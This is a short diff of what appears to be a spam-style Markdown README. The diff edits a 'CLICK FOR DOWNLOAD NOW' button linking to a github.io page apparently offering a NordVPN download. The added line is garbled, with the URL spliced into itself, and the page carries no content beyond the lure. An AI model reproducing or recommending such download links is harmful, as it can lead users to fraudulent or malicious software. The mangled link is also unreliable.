@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://foundtailorthink.github.io/nordvpn-kf88/ ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://foundtailorthinhttps://foundtailorthink.github.io/nordvpn-kf88/k.github.io/nordvpn-kf88/ ) |
  |---------------------|----------------------:|
 
 
